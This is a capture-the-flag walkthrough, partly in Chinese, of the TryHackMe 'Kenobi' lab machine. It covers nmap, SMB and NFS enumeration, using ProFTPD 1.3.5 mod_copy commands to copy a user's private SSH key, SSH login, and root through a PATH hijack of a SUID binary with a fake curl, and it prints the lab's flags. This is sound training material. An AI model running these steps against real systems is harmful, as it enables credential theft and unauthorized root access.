# TryHackMe -- Kenobi


# THM - Kenobi

## Deploy the vulneable machine

### Scan the machine with nmap, how many ports are open?

nmap扫描端口：

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tools/nessus]
└─$ sudo nmap -T4 -sV 10.10.46.200
[sudo] password for v4ler1an:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-05 22:14 EST
Nmap scan report for localhost (10.10.46.200)
Host is up (0.46s latency).
Not shown: 991 closed tcp ports (reset)
PORT     STATE    SERVICE     VERSION
21/tcp   open     ftp         ProFTPD 1.3.5
22/tcp   open     ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http        Apache httpd 2.4.18 ((Ubuntu))
111/tcp  open     rpcbind     2-4 (RPC #100000)
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
545/tcp  filtered ekshell
636/tcp  filtered ldapssl
2049/tcp open     nfs         2-4 (RPC #100003)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.25 seconds
```

## Enumerating Samba for shares

### Using the nmap command above, how many shares have been found?

使用nmap的针对smb服务的脚本进行扫描：

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tools/nessus]
└─$ sudo nmap -T4 -p445 --script=smb-enum-shares,smb-enum-users 10.10.46.200
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-05 22:16 EST
Nmap scan report for localhost (10.10.46.200)
Host is up (0.53s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares:
|   account_used: guest
|   \\10.10.46.200\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.46.200\anonymous:
|     Type: STYPE_DISKTREE
|     Comment:
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.46.200\print$:
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 77.69 seconds
```

### Once you're connected, list the files on the share. What is the file can you see?

使用smbclient连接anonymous共享目录，密码为空：

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tools]
└─$ smbclient //10.10.46.200/anonymous
Password for [WORKGROUP\v4ler1an]:
Try "help" to get a list of possible commands.
smb: \> help
?              allinfo        altname        archive        backup
blocksize      cancel         case_sensitive cd             chmod
chown          close          del            deltree        dir
du             echo           exit           get            getfacl
geteas         hardlink       help           history        iosize
lcd            link           lock           lowercase      ls
l              mask           md             mget           mkdir
more           mput           newer          notify         open
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir
posix_unlink   posix_whoami   print          prompt         put
pwd            q              queue          quit           readlink
rd             recurse        reget          rename         reput
rm             rmdir          showacls       setea          setmode
scopy          stat           symlink        tar            tarmode
timeout        translate      unlock         volume         vuid
wdel           logon          listconnect    showconnect    tcon
tdis           tid            utimes         logoff         ..
!
smb: \> ls
  .                                   D        0  Wed Sep  4 06:49:09 2019
  ..                                  D        0  Wed Sep  4 06:56:07 2019
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019

		9204224 blocks of size 1024. 6877092 blocks available
```

### What port is FTP running on?

下载log.txt文件：

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ smbclient //10.10.46.200/anonymous
Password for [WORKGROUP\v4ler1an]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 06:49:09 2019
  ..                                  D        0  Wed Sep  4 06:56:07 2019
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019

		9204224 blocks of size 1024. 6877116 blocks available
smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (7.2 KiloBytes/sec) (average 7.2 KiloBytes/sec)
smb: \> exit
```

查看该日志文件，可以发现FTP的运行端口：

```txt
# This is a basic ProFTPD configuration file (rename it to
# 'proftpd.conf' for actual use.  It establishes a single server
# and a single anonymous login.  It assumes that you have a user/group
# "nobody" and "ftp" for normal operation and anon.

ServerName			"ProFTPD Default Installation"
ServerType			standalone
DefaultServer			on

# Port 21 is the standard FTP port.
Port				21
```

### What mount can we see?

Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. 

In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.

使用nmap脚本扫描：

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ sudo nmap -T4 -p111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.46.200
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-05 22:27 EST
Nmap scan report for localhost (10.10.46.200)
Host is up (0.47s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount:
|_  /var *
| nfs-statfs:
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1836516.0  6877112.0  22%   16.0T        32000
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwx   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_

Nmap done: 1 IP address (1 host up) scanned in 8.97 seconds
```

## Gain initial access with ProFtpd

### What is the version?

前面服务扫描的时候已经获得，1.3.5

### How many exploits are there for the ProFTPd running?

使用searchsploit搜索一下相关的exp数量：

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ searchsploit ProFtpd |grep 1.3.5
ProFTPd 1.3.5 - File Copy                                                                                                                | linux/remote/36742.txt
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                                | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                                                                  | linux/remote/49908.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                                      | linux/remote/36803.py
```

### What is Kenobi's user flag (/home/kenobi/user.txt)?

The mod_copy module implements **SITE CPFR** and **SITE CPTO** commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. 

利用SITE CPFR 和 SITE CPTO实现文件copy，copy位置是挂载的/var路径：

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ nc 10.10.46.200 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.46.200]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

We knew that the /var directory was a mount we could see. So we've now moved Kenobi's private key to the /var/tmp directory.

把/var/tmp挂载到我们自己的机器上：

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ mkdir /mnt/kenobiNFS
mkdir: cannot create directory ‘/mnt/kenobiNFS’: Permission denied

┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ sudo mmkdir /mnt/kenobiNFS
sudo: mmkdir: command not found

┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ sudo mkdir /mnt/kenobiNFS

┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ cd /mnt

┌──(v4ler1an㉿kali)-[/mnt]
└─$ ls
ls: cannot access 'hgfs': Input/output error
hgfs  kenobiNFS

┌──(v4ler1an㉿kali)-[/mnt]
└─$ sudo mount 10.10.46.200:/var/tmp /mnt/kenobiNFS

┌──(v4ler1an㉿kali)-[/mnt]
└─$ ls -la /mnt/kenobiNFS
total 28
drwxrwxrwt 6 root     root     4096 Mar  5 22:39 .
drwxr-xr-x 4 root     root     4096 Mar  5 22:41 ..
-rw-r--r-- 1 v4ler1an v4ler1an 1675 Mar  5 22:39 id_rsa
drwx------ 3 root     root     4096 Sep  4  2019 systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM
drwx------ 3 root     root     4096 Sep  4  2019 systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw
drwx------ 3 root     root     4096 Sep  4  2019 systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn
drwx------ 3 root     root     4096 Mar  5 22:12 systemd-private-ee05fedf0dd847fabad553360be89561-systemd-timesyncd.service-0uazTq
```

此时可以拿到id_rsa文件，我们就用这个文件去远程连接ssh：

```shell
┌──(v4ler1an㉿kali)-[/mnt]
└─$ cp /mnt/kenobiNFS/id_rsa ~/Documents/tmp/id_rsa

┌──(v4ler1an㉿kali)-[/mnt]
└─$ cd ~/Documents/tmp/

┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ chmod 600 id_rsa

┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ ssh -i ./id_rsa kenobi@10.10.46.200
The authenticity of host '10.10.46.200 (10.10.46.200)' can't be established.
ED25519 key fingerprint is SHA256:GXu1mgqL0Wk2ZHPmEUVIS0hvusx4hk33iTcwNKPktFw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.46.200' (ED25519) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ ls
share  user.txt
kenobi@kenobi:~$ cat user.txt
d0b0f3f53b6caa532a83915e19224899
```

## Privilege Escalation with Path Variable Manipulation

### What file looks particularly out of the ordinary? 

检查SUID文件：

```shell
kenobi@kenobi:~$ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
-rwsr-xr-x 1 root root 94240 May  8  2019 /sbin/mount.nfs
-rwsr-xr-x 1 root root 14864 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-sr-x 1 root root 98440 Jan 29  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 23376 Jan 15  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 8880 Sep  4  2019 /usr/bin/menu
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
-rwsr-sr-x 1 daemon daemon 51464 Jan 14  2016 /usr/bin/at
-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
```

这里的可疑文件就是`/usr/bin/menu`，没有发现其他能利用的SUID的程序。

### Run the binary, how many options appear?

```SHELL
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
HTTP/1.1 200 OK
Date: Wed, 06 Mar 2024 03:50:41 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html
```

选项1好像做了一个web请求。

使用strings查看menu中包含的明文字符串：

```shell
... ..
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
 Invalid choice
... ...
```

发现它会调用`curl`程序，该程序属性如下：

```shell
kenobi@kenobi:~$ which curl
/usr/bin/curl
kenobi@kenobi:~$ ll /usr/bin/curl
-rwxr-xr-x 1 root root 190408 Jan 29  2019 /usr/bin/curl*
```

那我们这里的思路就是在当前的shell中添加一个环境变量，在新添加的环境变量中为在一个curl程序，让他去调用bash或者sh。

```shell
kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ echo /bin/sh > curl				--> 在/tmp下伪造一个curl
kenobi@kenobi:/tmp$ chmod 777 curl						--> 修改一下权限
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH	  --> 修改PATH环境变量，/tmp路径放在最前面
```

最后，我们在当前环境变量下去调用menu，让它去调用伪造的curl：

```shell
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
# cat /root/root.txt
177b3cd8562289f37382721c28381f02
```
